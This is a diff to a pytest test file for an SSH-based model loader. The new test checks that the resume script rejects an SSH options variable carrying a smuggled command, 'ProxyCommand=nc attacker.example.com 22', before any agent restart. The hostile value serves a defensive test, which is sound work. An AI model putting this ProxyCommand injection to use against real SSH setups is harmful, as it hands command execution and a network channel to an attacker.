@@ -1,8 +1,13 @@
 from __future__ import annotations
 
+import importlib.util
 import os
 import subprocess
 from pathlib import Path
+
+import pytest
+
+from vllm_loader.config.targets import TargetConfig, TransportKind
 
 
 def _script_test_env(**overrides: str) -> dict[str, str]:
@@ -12,6 +17,16 @@ def _script_test_env(**overrides: str) -> dict[str, str]:
             env.pop(key, None)
     env.update(overrides)
     return env
+
+
+def _load_real_model_resume_check():
+    path = Path("scripts/real_model_resume_check.py")
+    spec = importlib.util.spec_from_file_location("real_model_resume_check_test", path)
+    if spec is None or spec.loader is None:
+        raise AssertionError(f"unable to import {path}")
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module
 
 
 def test_remote_validation_uses_textual_smoke_for_real_config() -> None:
@@ -459,6 +474,30 @@ def test_real_model_resume_check_fails_fast_on_health_errors() -> None:
 
     assert 'last.get("error_kind")' in script
     assert 'last.get("phase") in {"ERROR", "STOPPED"}' in script
+
+
+def test_real_model_resume_check_validates_ssh_opts_before_agent_restart(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    module = _load_real_model_resume_check()
+    monkeypatch.setenv(
+        "VLLM_LOADER_SSH_OPTS",
+        "-o ProxyCommand='nc attacker.example.com 22'",
+    )
+    monkeypatch.setattr(
+        module.subprocess,
+        "run",
+        lambda *_args, **_kwargs: pytest.fail("ssh restart should not be attempted"),
+    )
+    target = TargetConfig(
+        name="blackbird",
+        transport=TransportKind.SSH,
+        host="bgconley@10.25.0.51",
+        ssh_opts_env="VLLM_LOADER_SSH_OPTS",
+    )
+
+    with pytest.raises(ValueError, match="command-bearing SSH option"):
+        module._restart_target_agent(target)
 
 
 def test_gated_model_auth_check_uses_isolated_agent_and_disables_implicit_token() -> None:
